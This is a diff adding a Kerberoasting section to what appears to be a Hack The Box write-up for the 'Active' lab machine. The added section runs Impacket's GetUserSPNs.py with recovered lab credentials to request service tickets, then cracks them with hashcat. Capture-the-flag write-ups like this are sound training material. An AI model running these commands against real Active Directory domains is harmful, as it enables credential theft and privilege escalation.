@@ -87,4 +87,16 @@ Validate access with the recovered account:
 
 ---
 
+## Privilege Escalation
+### Kerberoasting
+Since I now had valid credentials, I performed a Kerberoasting attack to pull crackable service tickets for any high-privilege accounts.
 
+`python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' -dc-ip 10.129.18.74 -request -outputfile tgs_hashes.txt`
+
+![](/assets/img/htb/Active/active08.png)
+
+Crack the Kerberos ticket with `hashcat`.
+
+`hashcat -m 13100 tgs_hashes.txt /home/user/tools/rockyou.txt -a 0`
+
+![](/assets/img/htb/Active/active09.png)
